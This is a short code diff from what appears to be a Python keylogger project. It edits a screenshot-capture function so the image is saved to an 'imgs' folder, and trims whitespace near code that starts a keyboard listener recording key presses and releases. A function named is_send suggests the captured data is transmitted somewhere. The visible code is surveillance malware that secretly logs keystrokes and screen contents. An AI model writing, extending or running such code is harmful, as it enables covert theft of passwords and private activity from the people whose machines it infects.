@@ -52,7 +52,7 @@ def is_send():
 
 def take_screen():
     img = ImageGrab.grab()
-    img.save("screen.png")
+    img.save(path + "/imgs/screen.png")
 
 
 def get_img():
@@ -129,7 +129,6 @@ class Keylogger:
         keyboard_listener = keyboard.Listener(on_press=self.get_key, on_release=self.get_Release)
         with keyboard_listener:
             keyboard_listener.join()
-
 
 
 if __name__ == '__main__':
